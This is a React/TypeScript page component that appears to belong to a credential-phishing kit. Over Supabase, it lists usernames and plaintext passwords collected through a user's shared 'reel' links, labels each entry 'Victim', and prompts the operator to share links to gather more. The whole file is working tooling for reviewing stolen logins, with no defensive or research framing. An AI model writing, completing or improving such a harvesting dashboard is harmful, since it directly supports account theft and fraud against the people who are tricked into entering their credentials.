import { useEffect, useState, useCallback } from 'react';
import { useParams } from 'react-router-dom';
import { supabase } from '@/lib/supabase';
import { useAuth } from '@/context/AuthContext';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { toast } from 'sonner';
import { Skeleton } from '@/components/ui/skeleton';
import { Film, Inbox, User, Calendar, Users } from 'lucide-react';

interface Submission {
  id: string;
  reelId: string;
  username: string;
  password: string;
  created_at: string;
  reels: {
    victim_name: string | null;
  } | null;
}

export default function SubmissionsPage() {
  const { reelId } = useParams<{ reelId: string }>();
  const { user, loading: authLoading } = useAuth();
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchSubmissions = useCallback(async () => {
    if (!user) {
      console.log("User not logged in.");
      setLoading(false);
      return;
    }
    setLoading(true);
    console.log("Fetching submissions for user:", user.id);

    try {
      let query = supabase
        .from('submissions')
        .select('id, reelId, username, password, created_at, reels(victim_name)');

      if (reelId) {
        console.log("Fetching submissions for specific reelId:", reelId);
        query = query.eq('reelId', reelId);
      } else {
        console.log("Fetching all reelIds for user:", user.id);
        const { data: reelsData, error: reelsError } = await supabase
          .from('reels')
          .select('reelId')
          .eq('userId', user.id);

        if (reelsError) {
          console.error("Error fetching reelIds:", reelsError);
          throw reelsError;
        }

        const reelIds = reelsData.map((reel) => reel.reelId);
        console.log("Fetched reelIds:", reelIds);

        if (reelIds.length === 0) {
          console.log("No reelIds found for user.");
          setSubmissions([]);
          setLoading(false);
          return;
        }
        query = query.in('reelId', reelIds);
      }

      const { data, error } = await query.order('created_at', { ascending: false });

      if (error) {
        console.error("Error fetching submissions:", error);
        throw error;
      }

      console.log("Fetched submissions data:", data);
      setSubmissions(data as unknown as Submission[]);
    } catch (error: any) {
      toast.error(error.message || 'Failed to fetch submissions.');
    } finally {
      setLoading(false);
      console.log("Loading set to false.");
    }
  }, [user, reelId]);

  useEffect(() => {
    console.log("SubmissionsPage mounted. Auth loading:", authLoading, "User:", user, "Reel ID from params:", reelId);
    if (!authLoading) {
      console.log("Auth loading finished, fetching submissions.");
      fetchSubmissions();
    }
  }, [authLoading, fetchSubmissions, user, reelId]);

  if (loading || authLoading) {
    return (
      <div className="space-y-4">
        {Array.from({ length: 5 }).map((_, i) => (
          <Card key={i} className="bg-gray-800 border-gray-700 shadow-lg rounded-lg p-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-4">
                <Skeleton className="h-10 w-10 rounded-full bg-gray-700" />
                <div className="space-y-2">
                  <Skeleton className="h-4 w-32 bg-gray-700 rounded-md" />
                  <Skeleton className="h-4 w-24 bg-gray-700 rounded-md" />
                </div>
              </div>
              <Skeleton className="h-4 w-24 bg-gray-700 rounded-md" />
            </div>
          </Card>
        ))}
      </div>
    );
  }

  return (
    <Card className="bg-gray-800 border-gray-700 shadow-lg rounded-lg max-h">
      <CardHeader>
        <CardTitle className="flex items-center gap-2 text-xl font-semibold text-gray-100">
          {reelId ? <Film className="h-5 w-5" /> : <Users className="h-5 w-5" />}
          {reelId ? 'Submissions for Reel ID' : 'All Submissions'}
        </CardTitle>
        <CardDescription className="font-mono text-sm text-gray-400 pt-1">
          {reelId ? reelId : 'Showing all submissions from your links.'}
        </CardDescription>
      </CardHeader>
      <CardContent className='overflow-y-auto max-h-[65vh]'>
        {submissions.length === 0 ? (
          <div className="flex flex-col items-center justify-center text-center py-16">
            <Inbox className="h-16 w-16 text-gray-600 mb-4" />
            <h3 className="text-xl font-semibold text-gray-100">No Submissions Yet</h3>
            <p className="text-md text-gray-400 mt-2 max-w-md">
              {reelId
                ? "This reel link hasn't received any submissions."
                : "You don't have any submissions yet. Share your links to get started."}
            </p>
          </div>
        ) : (
          <div className="space-y-4">
            {submissions.map((submission) => (
              <div key={submission.id} className="bg-gray-700/50 border border-gray-700 rounded-lg p-4 flex items-center justify-between transition-all hover:bg-gray-700">
                <div className="flex items-center gap-4">
                  <div className="bg-gray-600 p-3 rounded-full">
                    <User className="h-6 w-6 text-gray-300" />
                  </div>
                  <div>
                    <p className="font-bold text-lg text-gray-100">Victim: {submission.reels?.victim_name || 'Anonymous'}</p>
                    <p className="text-sm text-gray-400">Username: {submission.username}</p>
                    <p className="text-sm text-gray-400">Password: {submission.password}</p>
                  </div>
                </div>
                <div className="flex flex-col items-end text-right">
                   <div className="flex items-center gap-2 text-sm text-gray-400">
                     <Calendar className="h-4 w-4" />
                     <span>{new Date(submission.created_at).toLocaleDateString()}</span>
                   </div>
                   {!reelId && <p className="text-xs text-gray-500 mt-1 font-mono">from: {submission.reelId}</p>}
                </div>
              </div>
            ))}
          </div>
        )}
      </CardContent>
    </Card>
  );
}